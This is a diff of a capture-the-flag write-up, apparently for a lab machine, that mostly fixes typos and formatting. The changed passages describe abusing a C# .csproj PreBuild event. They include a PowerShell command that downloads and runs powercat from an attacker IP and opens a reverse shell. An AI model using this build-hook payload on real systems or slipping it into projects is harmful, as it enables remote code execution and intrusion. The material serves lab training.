@@ -70,7 +70,7 @@ The directory `repo/.git` is created after this. The `.git` directory contains t
 ```markdown
 > git add .
 ```
-Check there no more untracked files in the git repo to be added.
+Check there are no more untracked files in the git repo to be added.
 ```markdown
 > git status
 On branch master
@@ -132,7 +132,7 @@ Keyboard interrupt received, exiting.
 
 ![visual2](https://github.com/g1vi/Write-up/assets/120142960/30e914ad-fd62-4141-a0bb-3f3cb841d533)
 
-Once we are sure our git repo works, we have to find a way to make the server execute the code after compiling it. This can be done manipulating pre and post events in the c# `.csproj` project file. These events are triggered by the msbuild compiler before or after the compiling process ends. We will add a pre event, calling a powercat reverse shell before the building process begins. Just create any simple Program.cs source file and, in the `myapp.csproj` file, add the pre event.
+Once we are sure our git repo works, we have to find a way to make the server execute the code after compiling it. This can be done manipulating pre and post events in the c# `.csproj` project file. These events are triggered by the msbuild compiler before or after the compiling process ends. We will add a pre event, calling a powercat reverse shell before the building process begins. Just create any simple `Program.cs` source file and, in the `myapp.csproj` file, add the pre event.
 ```markdown
 <Project Sdk="Microsoft.NET.Sdk">
 
@@ -144,7 +144,7 @@ Once we are sure our git repo works, we have to find a way to make the server ex
   </PropertyGroup>
 
   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.80:8080/powercat.ps1');powercat -c 10.10.14.59 -p 1919 -e cmd" />
+    <Exec Command="powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.59:8080/powercat.ps1');powercat -c 10.10.14.59 -p 1919 -e cmd" />
   </Target>
 
 </Project>
@@ -158,7 +158,7 @@ After this, add again all files to git, commit, update server info and restart t
 > git update-server-info
 > python3 -m http.server 80
 ```
-Start another python http serving powercat.ps1 and start a listener. Enter red box ip in the web app url box, after the c# files are pulled and processed, a reverse shell is received on port 1919.
+Start another python http serving `powercat.ps1` and start a listener. Enter red box ip in the web app url box, after the c# files are pulled and processed, a reverse shell is received on port 1919.
 <br>
 <br>
 ### PHASE 3. System
